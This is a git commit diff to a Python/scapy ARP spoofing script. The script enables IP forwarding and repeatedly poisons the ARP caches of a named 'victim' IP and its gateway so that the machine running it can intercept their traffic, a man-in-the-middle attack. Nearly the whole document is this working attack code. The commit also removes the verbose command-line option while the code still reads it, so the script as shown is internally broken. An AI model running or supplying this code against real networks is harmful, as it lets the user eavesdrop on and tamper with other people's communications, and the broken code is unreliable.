29a76f8503eb01a1c65cb2851fa928f49957bf10
Naeempatel010 <naeempatel010@gmail.com>
2023-04-13 19:46:36 -0400

    fixed the verbose error

--- ARP-spoof/arp_spoofer.py
+++ ARP-spoof/arp_spoofer.py
@@ -8,28 +8,16 @@ def _enable_linux_iproute():
     file_path = "/proc/sys/net/ipv4/ip_forward"
     with open(file_path) as f:
         if f.read() == 1:
-            # already enabled
             return
     with open(file_path, "w") as f:
         print(1, file=f)
 
 
 def enable_ip_route(verbose=True):
-    """
-    Enables IP forwarding
-    """
-    if verbose:
-        print("[!] Enabling IP Routing...")
+    print("[!] Enabling IP Routing...")
     _enable_linux_iproute()
-    if verbose:
-        print("[!] IP Routing enabled.")
-
 
 def get_mac(ip):
-    """
-    Returns MAC address of any device connected to the network
-    If ip is down, returns None instead
-    """
     ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
     if ans:
         return ans[0][1].src
@@ -45,41 +33,23 @@ def spoof(target_ip, host_ip, verbose=True):
 
 
 def restore(target_ip, host_ip, verbose=True):
-    """
-    Restores the normal process of a regular network
-    This is done by sending the original informations 
-    (real IP and MAC of `host_ip` ) to `target_ip`
-    """
-    # get the real MAC address of target
     target_mac = get_mac(target_ip)
-    # get the real MAC address of spoofed (gateway, i.e router)
     host_mac = get_mac(host_ip)
-    # crafting the restoring packet
     arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
-    # sending the restoring packet
-    # to restore the network to its normal process
-    # we send each reply seven times for a good measure (count=7)
     send(arp_response, verbose=0, count=7)
-    if verbose:
-        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
 
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="ARP spoof script")
     parser.add_argument("target", help="Victim IP Address to ARP poison")
     parser.add_argument("host", help="Host IP Address, the host you wish to intercept packets for (usually the gateway)")
-    parser.add_argument("-v", "--verbose", action="store_true", help="verbosity, default is True (simple message each second)")
     args = parser.parse_args()
     target, host, verbose = args.target, args.host, args.verbose
-
     enable_ip_route()
     try:
         while True:
-            # telling the `target` that we are the `host`
             spoof(target, host, verbose)
-            # telling the `host` that we are the `target`
             spoof(host, target, verbose)
-            # sleep for one second
             time.sleep(1)
     except KeyboardInterrupt:
         print("[!] Detected CTRL+C ! restoring the network, please wait...")
